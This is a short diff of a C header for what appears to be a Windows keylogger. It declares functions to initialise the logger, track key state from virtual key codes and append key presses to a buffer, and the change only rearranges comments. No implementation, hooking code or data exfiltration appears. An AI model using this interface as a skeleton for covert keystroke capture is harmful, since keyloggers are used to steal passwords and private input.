@@ -35,12 +35,12 @@ typedef struct {
 } KEY_LOGGER;
 
 
-KEY_LOGGER* initKeyLogger(); // initialise a new key logger
-void keyLoggerCleanup(KEY_LOGGER* kLogger); // cleanup keylogger memory
+KEY_LOGGER* initKeyLogger();
 
-// update the bool state variables based on the key pressed, returns whether an update occurred
+void keyLoggerCleanup(KEY_LOGGER* kLogger);
+
 BOOL updateKeyLoggerState(KEY_LOGGER* kLogger, WPARAM wParam, LPDWORD vkCode);
-// method to add the content of a key press to the keyBuffer 
+
 RET_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode);
 
 void resetKLBufferAndKey(KEY_LOGGER* kLogger, char key);
